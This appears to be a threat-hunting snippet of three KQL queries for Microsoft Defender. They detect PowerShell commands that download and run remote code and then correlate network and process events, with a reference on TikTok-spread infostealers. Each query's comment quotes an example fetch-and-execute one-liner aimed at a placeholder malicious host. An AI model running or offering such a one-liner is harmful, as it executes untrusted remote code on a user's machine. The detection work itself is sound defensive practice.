Find the payload delivery.  
```
DeviceEvents
| where ActionType=="PowerShellCommand"
| extend Command=parse_json(AdditionalFields).Command
| where (Command has_all ("iex","irm","https://") or  Command has_all ('Invoke-Expression','Invoke-RestMethod','https://')) //iex (irm https://malicious.site/mal)
```  

Find the network connection activity.  
```
DeviceEvents
| where ActionType=="PowerShellCommand"
| extend Command=parse_json(AdditionalFields).Command
| where (Command has_all ("iex","irm","https://") or  Command has_all ('Invoke-Expression','Invoke-RestMethod','https://')) //iex (irm https://malicious.site/mal)
| join (DeviceNetworkEvents) on InitiatingProcessFileName,InitiatingProcessId 
```  

Find the invoked processes  
```  
DeviceEvents
| where ActionType=="PowerShellCommand"
| extend Command=parse_json(AdditionalFields).Command
| where (Command has_all ("iex","irm","https://") or  Command has_all ('Invoke-Expression','Invoke-RestMethod','https://')) //iex (irm https://malicious.site/mal)
| join (DeviceProcessEvents) on InitiatingProcessFileName,InitiatingProcessId 
```

References:  
https://www.trendmicro.com/en_us/research/25/e/tiktok-videos-infostealers.html  

